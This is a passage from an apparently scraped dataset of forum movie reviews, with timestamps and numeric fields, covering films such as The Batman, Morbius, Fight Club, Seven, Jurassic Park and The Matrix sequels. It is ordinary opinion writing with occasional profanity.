to back down and it is here where the climax of the movie is foreshadowed. They settle down the argument as Joe goes to pay for the breakfast and leaves the others to make the tip. Everybody contributes a dollar except Mr Pink which he explains by saying he doesn't believe in tipping for no reason. He believes that if a waitress really deserves a tip, then and only then should she be tipped. This is where many of the characters reveal their true intentions. Mr Pink argues in what most would consider a selfish manner with little empathy, this foreshadows his later attitudes toward the Dogs as shit hits the fan as he would be the one to obsess over the diamonds, be the one to refuse to take Mr Orange to a hospital to prevent himself from risk and ultimately be the most level headed of the Dogs. Mr White takes the ""honour amongst thieves"" approach and stands up for the waitresses, (much like he will stand up for Mr Orange later) explaining waitressing is a difficult job and is the only salvation for female non-college graduates. But Mr Oranges reaction is by far the most intriguing. Mr Orange then agrees with Mr Pink and asks for his dollar back. Mr Orange is a cop and him agreeing with Mr Pink is a way to maintain his cover and act like the other crooks and mimic their philosophies, and as Joe Cabbot returns to collect the tips, and asks who didn't put in a dollar, it is Mr Orange who rats him out. This one scene is cinema at its finest, a work of art and much like Tarantino's other work, incredibly unique. Then the title sequence begins to ""Little Green Bag"" by the George Baker Selection and quite possibly the coolest sequence of all time happens.",moviereviews,3363,600,55,0
1649507825.0,Sonic the Hedgehog 2 (2022): 10-Category Review,"Sonic the Hedgehog 2 is average, an example of modern popular movies. It's based on a recognized franchise, its main concern is merchandising, and its craft is mediocre. The narrative is irrelevant because its purpose is to put Sonic into action, introduce new characters, and leave room for a sequel. Motivations are flimsy, Marsden's plotline is pointless, and themes are hollow. Furthermore, there are excessive pop culture references. It's nice that Sonic 2 adopts the video game adventure and lore, but that still results in generic MacGuffins and nonsensical backstories. The cast has fun, but can't transform stale tropes into something fresh. 

Meanwhile, Sonic 2's filmmaking is inconsistent. The sound captures complex battles, alien voices, and the cartoonish tone. The cast is enhanced by Elba. Because this sequel goes bigger, the effects are more involved and the production embraces Sonic's universe (though blatant product placements persist). However, the music is utilized for comedy, yet is otherwise forgettable. Plus, there isn't a single interesting shot, and the final act sags due to an overextended runtime. Furthermore, Sonic 2 attempts more drama (which is commendable) but doesn't successfully blend that with its silly mood. Overall, Sonic 2 is watchable, but void of style or substance.

1648996910.0,Blade (1998): 10-Category Review,"Blade is amusing. It's cheesy and dated, but also competent. First, the writing is efficient. Blade's backstory is explained quickly and the narrative jumps right into his vampire hunting. Next, the R rating suits the edgy mood. Also, all the characters have motivation and purpose. Blade is out for revenge, Whistler is a role model, Dr. Jenson creates antidotes, and Frost is an insecure outcast among the vampire elite. Dialogue is cringey, some plot points are nonsense, and Blade's character is inconsistent, but this is forgivable because Blade is having fun with itself. It lacks depth, but Blade provides enough to be enjoyable.

Technically, Blade is proficient. The sound is sometimes unconvincing, but that's offset by complex combat and symbolically muted sequences. The excessive leather is corny, yet also trendsetting. Plus, the gory atmosphere is refreshing from a superhero movie. The editing has energetic fights, measured emotions, and occasional creativity (though, the runtime could've been trimmed). The CGI has aged poorly, but the practical effects are welcome. Also, the imagery captures action clearly and includes dramatic framing. Overall, Blade has engaging sequences (especially the intro), a balanced tone, and enthusiasm. It isn't a masterpiece, but Blade is fair entertainment.

1648820408.0,Morbius (2022): 10-Category Review,"Morbius is wasted space. The entire movie is filler, stalling until the inevitable superpower acquisition and the showdown with the hollow villain. It's baseline superhero shlock, but even its expected plot points are underwhelming because Morbius is disinterested in itself. The characters are boring, the romance is empty, the growth is stagnant, and the final fight is disappointing. Plus, Jared Leto is a complete flatline, providing no charisma or vulnerability to relate to. In every way, Morbius is void of emotional investment, leaving its blatant commercialism to stick out like a sore thumb. Simply put, Morbius is soulless. 

Technically, Morbius is less incompetent but still shallow. The sound is adequate and the effects are convincing (although CGI is severely overused), but those are the only positives. The music is a cheap imitation and occasionally awkward. The production design is painfully generic, with a noticeable lack of blood. The inconsistent editing warps the pacing and jumbles action sequences. Also, the imagery is bland, dark, and cluttered, which is unpleasant and confusing. Lastly, Morbius doesn't have direction. There isn't a tone, message, or passion driving this film. It's completely stale and clearly a cash grab. Viewers beware.

1646997525.0,Turning Red was better than I thought,"There are awful voice acting moments that sound like someone recorded in a library. The storyline, though, was pretty decent. 

So a girl’s family owns a temple dedicated to their ancestor who dedicated their life to the red panda. The mom did some very traumatizing stuff and the next day the girl turns into a red panda and doesn’t tell her parents. Her hair also turned red for some reason so she hid that in a hat. Her mom is then spying on her throughout the day and figures out her daughter is a panda. Chaos ensues and her friend figure it out and then use this to sell her body basically to get tickets to a concert which gets interrupted by her grandma being dramatic and then the girl just wants to be a furry forever. 
There can be hidden messages in the movie, like don’t be afraid to be a furry or don’t sell your body for money or that boy bands suck. It’s really not a good movie and if it were live action it would be a bad 80s movie but one you would enjoy nonetheless. There is also a ton of representation in the backgrounds of the movie, so that good.

1646406263.0,The Batman (2022): 10-Category Review,"The Batman is a compelling spin on the iconic character. This story has been done so frequently that it's hard to make it unique, yet The Batman distinguishes the character by focusing on his detective side. The Riddler serves that angle well, presenting puzzles for Wayne to crack and solidifying the movie's noir tone. Meanwhile, this is the most damaged film version of Wayne there is. His character is slightly monotonous (more dramatic outbursts would've been nice), but Pattinson elevates that material with wounded postures and troubled looks. Plus, Dano, Kravitz, Farrell, and Wright all deliver fascinating performances, keeping the emotional spectrum dynamic.

Furthermore, The Batman has assured craft. The production is realistically grimy, serving the corruption plotline. The music is imposing and melancholy, melding the sorrowful mood with its glimmer of hope. The cinematography uses attached camerawork, overheads, focus changes, and distinct colors to heighten intensity, intrigue, and atmosphere. Lastly, The Batman's unexpected highlight is its sound because of rich combat, ominous introductions, and abstract climaxes. Often, Batman's intimidating footsteps are heard before he emerges, and silence signifies overwhelmed characters. Ultimately, The Batman isn't the best in its illustrious franchise, but it's still an exceptional experience.

1646364283.0,The Batman Review: This is THE Batman movie!,"*Minor Spoilers*

I would say that titling this movie *The* Batman is an apt choice by the creators and they have done a huge service to all Batman fans around the world. This is The Dark Knight Detective we have all wanted to see since the beginning of the Batman films and they have succeeded in astounding fashion in bringing it to us on the big screen. This movie easily could have been a movie that wasn't even centered around Batman and it was still be a great film because it has everything in spades going for it. It is a psychological thriller that also acts as a crime noir film that has Batman in the lead, as well as a great cast of side characters who played their parts well. 

The Bat and the Cat have mad chemistry and Zoe Kravitz is such a believable Catwoman who is straight off of the comic book pages (sleek, sexy, sly, and purrrrrdy). The Riddler is a psychological nightmare and is quite the adversary for the bat. Paul Dano really had to pull some scary stuff out of the bag and where to play This creepy roll wear he is a sort of Zodiac Killer-esque foil to our knight in dark armor. Officer Gordon (Jeffrey Wright) the good cop we have all come to know and love and he and Bats make a great buddy cop duo. Alfred pennyworth (Andy Serkis) is the paternal wise figure and moral compass we have come to know and we can see where Bruce gets his skills and heart from.  The Penguin (Colin Farrell in unrecognizable makeup and fat suit) is a future don in the making with a hot streak and a waddle to boot. He reminds me of a mix of Godfather and Joe Pesci; quite a humorous combination down to the very New York Italian style accent (""whadda ya showin' me heeeeeeeah"")I was quite shocked at the casting of John Turturro as Carmine Falcone, as I'm used to seeing him in funny Adam Sandler movies. He did a great job as the crime lord and actually surprised me! 

The score was amazing with it being kind of like a mix between the 90's animated Batman series and the Darth Vader 'Imperial March' themes. This Batman is more realistic down to the suit he wears which is bulletproof, and the fact that he's not invincible and sometimes takes blows from his enemies. He is still learning on the job and you can tell because he makes a lot of rookie mistakes that he may or may not make in the future. I really appreciate all of the little things they included in this movie and there are too many to even mention in this review because the movie clocks in at an astounding three hours! It really didn't feel like 3 hours to me though because I was enjoying it every step of the way. The acting is superb and it will keep you on the edge of your seat throughout even when there is a long break in between action sequences; and trust me, the action is high octane. 

This Batman reminds me of a mix between Clint Eastwood, The Undertaker, and Robocop. The way he moves is quite imposing and he is always moving at a slow pace unless. This is a young Bruce Wayne who is still finding his way as the Batman and is filled with vengeance. He is in a smiling Playboy but rather a somber kind of emo type of guy who is also a recluse. I like this take as it is a nice change of pace from all previous renditions. 

I knew I would love this movie from the very beginning when the narration starts and you get to feel that it will be a crime noir film, the atmosphere is vibrant and full of life, yet dark and moody all in one. This was the perfect take on Gotham City and it reminded me of Batman Arkham Knight. Batman is like a mix between the Arkham games, Adam West and 90s cartoon, as well as a mix of every other live-action Batman that came before him. Robert Pattinson actually surprised me with this one and I am rooting for him as the Batman going forward. They better leave the series in Matt Reeves' hands because I am sure we will not get another Batman movie this good from anyone else!

1645710357.0,Dog (2022): 10-Category Review,"Dog is surprisingly tolerable. Road trips and reluctant pet friendships are fundamentally cliche, but Dog reaches beyond its predictable entertainment. Specifically, topics of trauma and support are addressed. These themes lack thorough development, but at least Dog isn't completely mindless. Tatum plays a wounded veteran who is delivering a retired combat dog in exchange for another tour of service. Along the way, they experience wacky hijinks and sobering dramatics (sometimes simultaneously). Unfortunately, this erratic story is internally conflicting. The drama works, but is undercut by messy messaging. Similarly, Tatum excels during vulnerable notes and is clumsy during forced comedy.

Furthermore, the technical aspects of Dog are also inconsistent. The symbolic sound is emotional, the cinematography is occasionally artistic, and the animal stunts are grounded. The shortcomings begin with the generic pop soundtrack, overt Army product placements, and thin casting around Tatum. Next, the editing uses formulaic montages and rushes the falling action. The ending comes too quickly after the climax, stifling its emotional impact. Lastly, the direction fails to balance the tone and messages. There's a good film buried in here, it just required more cohesion. Ultimately, Dog attempts to elevate its tropes but stumbles, making it a mixed bag.

1645113728.0,Kimi (2022): 10-Category Review,"Kimi is fruitful yet incomplete. First, the story introduces interesting ideas, but doesn't follow through. Zoe Kravitz's agoraphobic protagonist leads a confined life before stumbling upon a crime recorded on a home device. From there, Kravitz attempts to expose the crime, but she's met with a bureaucratic conspiracy. This premise establishes themes of captivity, surveillance, and systemic injustice. However, these subjects don't concretely pay off. Similarly, the acting is inconsistent. Kravitz optimizes the role, yet her material is one note. She adds layers but the script lacks a clear arc, stagnating her performance. Meanwhile, her supporting cast (besides Wilson) is weak.

Beyond Kravitz, Kimi's virtue is its filmmaking. The cast, production, and effects are sparse, but craftsmanship is potent. For example, the cinematography uses varied shots and compositions to keep entertainment high and emotions palpable. In Kravitz's apartment, overheads and extreme close-ups convey importance and maintain engagement. Outside, Dutch angles, unsteady movement, and confined spacing express intense anxiety. Plus, the editing efficiently matches Kravitz's mental state, the sound symbolically reflects her perspective, and the music is oddly fitting. Soderbergh gets plenty out of this limited project. Ultimately, Kimi has merit but isn't a must-see.

1645021779.0,Death on the Nile (2022): 10-Category Review,"Death on the Nile is similar to its predecessor. The mystery mechanics are superb (expected from Agatha Christie), but the execution feels underwhelming. All the pieces are in place: the setting is fun, the characters are diverse, and the reveal is both earned and surprising. However, it all falls a bit flat because time is mismanaged. Fundamentally, Gadot and Hammer (the main additions) are stiff and stale, dampening the film's momentum. Meanwhile, the newcomers who are interesting (Okonedo, Mackey, and Brand) never get enough time to shine. Branagh is clearly an engaged protagonist, but the script is log-jammed around him.

Technically, Death on the Nile is hit and miss. The symbolic silence is effective, the cinematography utilizes movement and composition, and the production design sells the time period. However, the highlights mostly stop there. The editing successfully introduces the mystery, yet drags in the first act. The music is fun during band performances, but is otherwise forgettable. The cast is recognizable but hardly optimized. Lastly, there's simply too much CGI. It's distracting, cheapens the extravagant location, and undercuts the era. Overall, Death on the Nile means well but contains too many missteps to land as a universal success.

1643552518.0,Fight Club (1999): 10-Category Review,"Fight Club is a slick combination of art and entertainment. Ultimately, it’s a cautionary tale of consumerism's breeding and antagonization of toxic masculinity. Through the chaos, Fight Club offers emotional vulnerability as the solution to that vicious cycle. Indeed, this narrative is as relevant as ever. Plus, Pitt and Norton bring intense passion to their roles. Norton fluidly evolves from dejected, to invigorated, to overwhelmed, to empowered. Meanwhile, Pitt is at his absolute best, forcefully embodying his cult of personality. Collectively, these dynamics produce a perfect storm of commentary, impact, and relatability that will draw a reaction from all viewers.

Simultaneously, Fincher creates an existential atmosphere that feels both alluring and unhinged. Visually, this is done with symbolic colors, hypnotic camerawork, and surreal composition. The audio contributes with meta narrations, psychological distortions, and exaggerated sounds. The editing has a super-charged structure and tempo, melding realities and giving the film a dreamlike quality. Additionally, the production design blends chic with decay, the effects are modern yet gritty, and the soundtrack ends with the best song possible (all of which underscore the themes). Overall, Fight Club is a masterpiece of contemporary angst and a punch of renegade art.

1643464456.0,Seven (1995): 10-Category Review,"Seven is a perfect crime thriller. It's impactful, thematic, suspenseful, and character-driven. It fully embraces its jaded worldview through gruesome content and a culminating conclusion. Morgan Freeman excels as a demoralized homicide detective. He displays flashes of buried optimism, but is deeply nihilistic. Meanwhile, Brad Pitt is an ideal counterpart. Young and energized, Pitt genuinely believes he can make a positive difference. While these two crack the grisly case, their relationship develops into a true friendship. The investigation is captivating, but their bond is Seven's core. Therefore, their vulnerability and authenticity are crucial to the film's success.

Furthermore, Seven is brilliantly enhanced by Fincher's filmmaking. First, the cold imagery often suggests rather than displays violence. This urges viewers to imagine the brutalities for themselves, which is far more haunting. The editing is slow and deliberate, masterfully mounting tension. The production design is gross and decrepit, underscoring the theme of moral decay. The effects are vividly shocking yet measured, always respecting the horror. Lastly, Fincher's direction flawlessly captures a grim tone, festering atmosphere, and methodical tempo. Thus, Seven is a transformation of its parts, a genuine piece of art, and utterly unforgettable.

Rating: 10/10

Director: P. T. Anderson

Music: Jonny Greenwood

Cinematography: Robert Elswit

Review: P. T. Anderson’s 2007 film is to say the least a modern masterpiece. It’s beautiful, it’s astonishing, and it’s challenging. Before I get into the body of my review I’d like to point out the controversy surrounding the film. While for the most part this film is beloved and critically acclaimed, there is a vocal minority of people who believe this film to be anti-Christian. I, coming from a Christian background, disagree and I’ll explain why later. To begin, the cinematography is gorgeous. It is obvious that each shot is taken with thoughtful care. The score is conducted by Jonny Greenwood, and once again he does an outstanding job. With that out of the way, the story is phenomenal. At its core it is the classic feud between two men seeking wealth and power. On one side we have Daniel Planveiw, an oilman seeking profit wherever he can make it, and on the other Eli Sunday, the acclaimed preacher of The Church of the Third Revelation. There are a multitude of things that differentiate the two: Eli is a Christian; Daniel considers oil his god, Daniel gets his money by working for it; Eli gets his money and power through deceiving his congregation, etc. However, there is one thing that the two share in common: Greed. Daniel Planview’s greed is the most obvious in the movie. Daniel goes around the country buying up any land where he can find oil. Daniel puts his search for wealth ahead of everything, eventually including his adopted child, whom he’d been using as leverage when buying land. Eli’s greed on the other hand takes a little bit more reading into. Also, what I’m about to discuss is my reasoning behind my disagreement with the statement earlier. The film does a splendid job of making it clear that Eli isn't a true preacher. He commits strange exorcisms and never actually preaches anything from the Bible. By making it clear that Eli isn’t a true preacher, I do not feel as though there are any jokes being made at a Christian’s expense. In this feud we see Daniel’s wealth rise and mental state fall in a spiraling hectic race to the finish. The film is great and I truly believe this is one of the only masterpieces of this century so far.",moviereviews,2298,403,55,0
1643378795.0,Gone Girl (2014): 10-Category Review,"Gone Girl is a wild ride of deception. It's not Fincher's most intelligent project, but Gone Girl compensates with sheer entertainment. The story is about a man whose wife mysteriously disappears and the subsequent fallout. While it scrutinizes modern journalism, public opinion, and the legal system, its main focus is on twisted thrills. Ben Affleck believably portrays the layers of an unhappy man who needs to put on a wholesome appearance, while Rosamund Pike brings an extreme dynamic that is impossible to ignore. Thus, this film is emotionally driven by its puzzling plot, but that's supported by digestible themes and strong performances.

Plus, Fincher continues his filmmaking excellence. Gone Girl isn't his best work, but there are still plenty of technicals to admire. First, Trent Reznor's music is a perfect fit for Fincher's methodical nature. It never overtakes a scene, but the score is constantly serving the ominous atmosphere and mounting tension. Next, the cinematography is cool and collected like usual, adding in suggestive imagery to emphasize themes and feelings. Lastly, the editing weaves perspectives into an exciting narrative structure and intensifies action sequences with quick, successive blackouts. Ultimately, Gone Girl is a well-rounded production that should entertain most viewers.

1642774518.0,Seven Samurai (1954): 10-Category Review,"Kurosawa's Seven Samurai is a foundational film. Despite its age, it remains an ideal template for current blockbusters. It's rich with themes, defined characters, and meaningful action. First, the plot is a quintessential tale of heroes uniting for an honorable cause. Marvel constantly mimics this trope, but the imitators are countless. Meanwhile, characters are developed beyond warriors in battle. Viewers learn their mindsets and motivations. Each unique samurai adds to the story. Thus, Seven Samurai is ripe with ideas like unity, morality, humility, accountability, and identity. However, despite the film's intellectual density, its relatability keeps it entertaining. 

Next, Seven Samurai's filmmaking established every blockbuster fundamental. The music sets a daunting tone, the immersive production sells the era, the acting displays a cohesive range, and the effects are real stunts. Lastly, defined by its fluent motion, Seven Samurai has iconic cinematography and editing. Crowds, flames, and weather consistently motivate every shot and cut. Each frame is wholly utilized for meaning. Each edit expands on the action and its emotional weight. Overall, Kurosawa's vision makes Seven Samurai a concrete experience that carefully builds on itself. Therefore, Seven Samurai remains the gold standard of modern epics.

1642168837.0,Jurassic Park (1993): 10-Category Review,"Jurassic Park is a perfect Hollywood movie. It's justified entertainment married to excellent craft and meaning. Few films have balanced insight with enjoyment quite like this. First, the script's pacing and structure are exemplary. It introduces the adventurous plot, distinct characters, and higher themes with clarity and efficiency. The excitement properly builds because the action sequences are spaced out, thoroughly established, and earned. There's never a dull moment in Jurassic Park because it spends its time wisely, honors its subject matter, and respects its audience. The story isn't necessarily high art, but it's a great mixture that speaks to everyone.

Technically, Jurassic Park is comprehensive. The cinematography is epic and stylish, utilizing lighting, camerawork, and composition to heighten emotions and magnitude. The editing deftly paces plot points and intensifies action. The dinosaur sound design is iconic. The production design is authentically grand and commercialized. Plus, the music and special effects are some of the best ever. Collectively, this creates an unforgettable experience that has defined an era. At the height of his game, Steven Spielberg elevated exceptional material into something truly historic. For these reasons, Jurassic Park remains one of the premier pieces of entertainment around.

1641656773.0,The 355 (2021): 10-Category Review,"The 355 is modern commercialism. It has little to say and is painfully generic, but it plays up its female-centric cast, hoping to make up for its thin substance. Diverse representation is a positive, but when it’s solely a marketing gimmick for an underwhelming project, it’s tainted. In fact, The 355 is fairly insulting because female led movies often get these poor efforts. Specifically, the film is a collection of cliches. Stock characters, predictable heel turns, unrealistic MacGuffins, exaggerated stakes, and some deus ex machina for good measure. Plus, the acting is bland (outside of Nyong'o, who brings legitimate emotion).

Technically, the camerawork is excessively shaky and the editing is overcut, fruitlessly compensating for dull action. The production design is uninspired and limited. The audio design is involved but sometimes misuses action sounds. The music is forgettable and the effects are overly sanitized. Lastly, the direction lacks unity, creating a mundane and inconsistent experience. None of this is necessarily terrible, but The 355 just isn't great. Overall, it feels like a halfhearted ploy that capitalizes on good-natured people who want to support minority empowerment. Unfortunately for those viewers, The 355 does very little for the female cause.

1640792258.0,Pan’s Labyrinth (2006): 10-Category Review,"Pan's Labyrinth is a beautiful union of heart and craft. The writing stands out because it has several strong layers. The story is emotionally impactful, open to interpretation, original, thematic, and grounded yet fantastical. Meanwhile, the actors bring life to potent characters, and nail arcs that feel fresh yet deeply relatable. All in all, Pan's Labyrinth is a magical journey through childlike imagination, built around a tragic core. The script alone is sure to capture the hearts and minds of all viewers. However, the filmmaking perfectly elevates that sentimental drive and constructs a unique atmosphere, creating something truly special.

The technicals of Pan's Labyrinth are purposeful and delicate, always enhancing its emotions. The cinematography subtly propels the film's themes through color schemes, composition, and framing. Scenes fluidly transition on matching camera movements, suggesting the relationship between imagination and reality. The sound design is surreal in supernatural scenes (heightening their magic) and stark in dramatic scenes (heightening their harshness). The music is mystical yet melancholy, flawlessly expressing the film's tone. Finally, the effects and production designs are visionary and make Pan's Labyrinth iconic. Indeed, this film is a passionate force and a thorough experience.

1640743254.0,Matrix 4,"Okay, I can break down why The Matrix 4 is one of the worst movies ever if you'd like. Mind you this is the short version because to go through everything wrong with this film in specifics would be much much longer. Firstly, the acting is unconvincing on levels that feel like good cosplay of bad campiness. I blame the director and materials - content wise - given to the actors to work with, not the actors themselves. A vast majority of time it felt akin to them practicing the scenes to learn lines rather than delivering convincingly. This problem largely caused by the nonsensical plot giving the characters no real purpose to go or be where they were. The writing and direction did it's best to cover up the sheer lack of meaningful plot content with convulsion that feels contemptuous of a viewer here to see next level sci-fi, of which the original Matrix set the bar for. It is not like some random director that hasn't proven masterful in this arena of filmmaking. This is someone who personally had a major hand in creating a contender for one of the best sci-fi movies of all time. The choreography of the characters and fight scenes often seemed like it was the work of an film school student who didn't take graduating seriously. This is a director who had a hand in being at the helm of The Matrix. The first one. The one with action scenes so wildly vivid that it might have changed your view on reality itself. Masterful. Do you know what else was a masterclass in the first Matrix? Every fight scene had a genuine purpose and impact on the plot as well as the characters involved in those fight scenes. It wasn't just *bad guys are in the same place as good guys.* The why and where are important. And then the one actor that really shined gets sidelined by a weak command made by Niobe. Niobe? Really? Mad that Neo got freed? Niobe? That's breaking the reality that you created. For what? To sideline any real showing of something new from the franchise? There were moments that were impressive shooting of action. NPS was a breathe of new in style and performance. It stands out as a testament of what this movie could have been. Jessica Henwick has been done a great disservice. What a performance it would have been if her supporting roles were written with more irreverent existence. More charisma. You can't have a character in a sci fi action film with fucked up hair and not make them a more significant presence. The thing is I love Lana Watchowski. Not just for her art but also for what she stands for as a soul. I think that's what upset me most about this movie. I was looking to her in a time in which her art was needed, and it wasn't nearly what it should have been. And that's fine and it doesn't fucking matter. Doesn't make her less of a brilliant person and doesn't mean I don't think she should be allowed to make what she wants. This didn't feel like material from her at her finest. We will not remain at our finest all days in all ways. None of us. The worst thing about this movie is that it feels like a misstep of her talents. A massive misstep. For fucks sake someone give Jessica Henwick a starring role in something that showcases her.  She could be a Beatrix Kiddo if given the chance. If there is one truth I speak knowingly it is that more Beatrix Kiddos and the world will be a better place. That's it. More Beatrix Kiddos.",moviereviews,3376,623,70,0
1640264240.0,The Matrix Resurrections (2021): 10-Category Review,"In some ways, The Matrix Resurrections is commendable. The story has uniqueness, themes, self-awareness, and clarity. The technical aspects are above-average and craft is implemented on all levels. The camerawork is cinematic, the editing shines during action and montages, the sound gets abstract, the effects are multifaceted, and the production design is substantial. The cast members are good and their performances all work. Yet, despite all this, Resurrections comes across as a muddled mess because it’s goals are tired, contradictory, and unmotivated. Simply put, this movie is missing the passion of its predecessors.

The biggest issue is the script. While unusual, it relapses into the exhausted focus of Neo saving Trinity. While self-aware and thematic, it doesn’t follow through with any of these ideas. While clear, it gets distracted with superfluous characters and concepts. Meanwhile, the filmmaking lacks the pop of the original trilogy. The imagery is less distinct, the runtime is bloated, the sound lacks style, the music isn’t memorable, and the production design feels hollow. Overall, Resurrections just doesn’t seem confident in itself and misses a strong vision. The film has its virtues, but mostly feels like a drained retread.

1640096775.0,The Matrix Reloaded (2003): 10-Category Review,"The Matrix Reloaded is its own worst enemy. The film evokes divisive opinions about its quality because, in some ways, it is good, and in other ways, it is terrible. The special effects exemplify this by mixing impressive practical stunts with off-putting CGI. Meanwhile, the overall filmmaking is above-average but, unfortunately, in service of a subpar script. The cinematography is engaged and lightly artistic, the sound is immersive and stylish, and the production design is elaborate and detailed. The cast is strong and the music is memorable. Still, Reloaded misses many viewers because its writing is plagued with issues.

First, Reloaded is boring. Much of its time is spent on long-winded conversations that say very little. The story fancies itself philosophical, but fails because it isn't as deep as it hopes. Themes of choice and control are beaten to death, all centering around Neo's love for Trinity. However, because such emphasis is placed on this relationship, its shallowness is exposed. Their romance worked as a cherry on top of the original, but needed fleshing out to carry Reloaded. Thus, we have a dull plot centered around a dull relationship. Ultimately, Reloaded's focus is misguided and dampens its solid craftsmanship.

1638123081.0,Spider-Man 2 (2004): 10-Category Review,"From a filmmaking perspective, Spider-Man 2 is similar to its predecessor. The cast, Danny Elfman, and Sam Raimi all continue their great work in the series. However, Spider-Man 2 upgrades some key aspects. First, Raimi expresses more freedom due to his previous success as he increases his style here. Overall, the imagery is moderately better with more motion, creative shots, and dramatic sequences. This is exemplified by the scene where Doc Ock wreaks havoc on the hospital staff. That segment is reminiscent of Evil Dead and genuinely fun.

Still, the most significant improvement is the script. Spider-Man 2 is brilliant because it's really a Peter Parker story. Much more time is spent with Toby Maguire than with his mask, making the movie very intimate. For the entire film, the protagonist struggles to live his dual life and loses himself to his secret identity. Real themes of responsibility and self-care are explored, pushing this beyond flashy entertainment. Furthermore, Maguire nails his conflicted character in a way that's rare for superhero movies. Fundamentally, Spider-Man 2 is special because it works as a drama first and the fantasy elements support that. Once again, this franchise sets the standard that echoes today.

1636131992.0,Eternals (2021): 10-Category Review,"Eternals is an overstuffed movie that fails to thoroughly focus on any of its ideas. Recognition is deserved because it touches on some interesting themes and provides light twists that break the ironclad Marvel mold. However, these themes are diluted by a cluttered story, and the twists (though uncommon for Marvel) are fairly standard for films overall. So, while Eternals has some relatively ambitious attempts, it still falls into classic pitfalls of franchise movies.

The most fundamental flaw of Eternals is its unclear intentions. Is it creating a cohesive experience, or is it merely a stepping stone to expand a franchise? When the main protagonist (Gemma Chan) has neither characteristics nor an arc, the narrative at hand feels like an afterthought. Meanwhile, side characters are superfluous, the villain lacks pay off, and the tone/pacing are erratic. Furthermore, the themes of Eternals aren’t fully explored. Ideas of autonomy, utilitarianism, and consciousness are introduced but, disappointingly, go nowhere. This lack of follow through applies to the filmmaking as well. Eternals has occasional visuals but is bogged down by CGI barf and bloated action. Ultimately, the movie reaches for respectable goals but fails to commit to a specific direction.

1635795582.0,Blade Runner 2049 (2017): 10-Category Review,"Blade Runner 2049 is perfect. The ambition of a pop culture epic met with the detail of high art; this film has everything. The story is grand and philosophical, but captures significant emotion with a bittersweet hero arc. The characters are motivated. The setting is extravagant but extremely relevant. Meanwhile, the imagery is striking and packed with meaningful layers. Color, lighting, texture, and composition are all optimized to orchestrate a shower of visual artwork. Working in tandem with the masterful soundtrack, this produces a mesmerizing experience that teleports viewers to a brand new world. 

On that topic, the production design is genius and creates an atmosphere that is fantastically futuristic yet hyper-real. Decaying yet sleek, decrepit yet beautiful, modern yet primal. The world of Blade Runner 2049 seamlessly highlights its class divide. This is driven home by the array of visual effects. Modern CGI mixed with tangible miniatures pushes those united feelings of old and new. Lastly, the acting brings everything together. Ryan Gosling appears stoic at first, but his portrayal of deeply repressed emotions that suddenly explode is exactly needed. A dejected protagonist fit for his dejected world. In conclusion, Blade Runner 2049 is a masterpiece and everything a movie should be.

1635736106.0,Thirteen Ghosts (2001): 10-Category Review,"Horror is known for schlock of all levels and Thirteen Ghosts lands somewhere in the middle. It isn’t high art or even necessarily a good movie, but Thirteen Ghosts does enough to deserve recognition. First, the writing is mildly interesting. Not much is fleshed out and the ending goes off the rails, but the premise of captured ghosts in a house of enchanted walls is unique. Meanwhile, although the acting is weighed down by the supporting cast (especially the kid), Tony Shalhoub and Matthew Lillard both elevate the material. Shalhoub is simply a supervisor actor and Lillard brings the ideal amount of ham.

Furthermore, Thirteen Ghosts is surprisingly proficient from a technical perspective. The editing during ghost attacks is chaotic and frightening. The ghosts have an echoing sound that feels distant and melancholy. However, the production design stands out at the highlight of the film. Because the ghosts have a distinct discolored look and the aesthetic of the house is modernized industrialism that's almost steampunk. Throw in the proficient camera work and effects, and the result is a movie that isn’t half bad. Thirteen Ghosts certainly has faults but, overall, it is a reasonable piece of schlock.

1632863152.0,Dear Evan Hansen (2021): 10-Category Review,"Any film that raises awareness around mental health has merit. However, merit does not make a good movie. Dear Evan Hansen strives for honorable goals, not only depicting mental health issues but also integrating musical numbers. Furthermore, there are surprisingly enjoyable elements beyond that ambition. The singing is strong, the ending isn't overly cliché, the camerawork is engaged, the edits and sound design have moments of elevation, and the acting is quite vulnerable. Yet, Dear Evan Hansen has some crucial flaws that deny its genuine success.

The casting of an adult as a high school student is sometimes forgivable, but Dear Evan Hansen is built around the viewer's emotional connection to a vulnerable child. This distortion undercuts that key bond. Meanwhile, empty platitudes riddle this script and the overall subject of mental-health feels sanitized, glossing the film with a hollow tone. That hollowness is accentuated by the sterile locations and lifeless production design, further robbing the movie of the vulnerability it depends on. Lastly, the film is simply too long and exhausting. Ultimately, this all gives Dear Evan Hansen a bloated, disjointed quality that feels like a collection of parts instead of a cohesive experience.

1631397366.0,Malignant (2021): 10-Category Review,"Sometimes cheese works. James Wan's Malignant is a great example of knowing how to go over the top with the right amount of self-awareness. The story may be ridiculous but that is an intentional choice that is executed with skill yet never taken too seriously. Chiefly, all the technical aspects are well done, creating an engaging and energizing atmosphere. The stylish lighting, active camera movement, and rich sound design all carry ample weight here. This transforms what could've been a silly project into a genuinely entertaining experience.

Meanwhile, the cast is fairly forgettable but that is okay. Annabelle Wallis anchors the film with a fine performance which is all Malignant really needs. This gives supporting actors like Michole Briana White room to have fun hamming it up. The synthwave score isn't totally relevant, but it sets a fitting mood and ties in somewhat with the electrical motif. The editing and production design are occasionally excessive as they push the creepy tone, but that is understandable and forgivable. All told, Malignant is a quintessential guilty pleasure that is distinctly more pleasure than guilt.

1630990566.0,Last of the Grads Review,"Me and my friends started watching this movie recently, The beginning the movie seemed bland and the narration was awful. We thought we would stay around to watch the movie since we had all been fans of Charlie White (aka Cr1TiKaL). After seeing our favorite protagonist Charlie (playing as Officer Greg) die we stopped watching the movie for the day with hope of great vengeance for the ""coast to coast killer."" The next day we stared watching again, we found the killings to be repetitive and yet.. interesting. One of the killings including having two recent graduates being shoved into a photo copier after being caught having sexual intercourse. There was no climax and more importantly the peak plot was as flat as a board. I felt a majority of the protagonist were unlikable and the ones that I did end up liking were killed off for no real reason besides Gore = Scary. ""Scary"".. Half of the murder scenes were treated as if this was a comedy or just too stupid to be scary. VFX wise were bad, every time someone's limbs were cut of it was clearly just some prop they bought off of wish. Also an unrealistic amount of blood, but that's normal for most indie horror films. Charlie White was used like a old fleshlight in this movie with a near 10 minutes of runtime, bringing in the support of his viewers without delivering his huge character arc we were all waiting for. Officer Greg was the only real hope for this movie and was killed of less than half way in. It felt like a crappy second season to the anime when MC of the show gets cut off only too be replaced with some knock off Chloë Grace Moretz as the main Protagonist. Honestly a shame from the producers at Keyway Pictures to me as a long time Cr1TiKaL fan. I would recommend watching this if you are looking for a over the top, horror/comedy, NOT for a serious Horror film.

In the end Officer Greg never really got his vengeance.

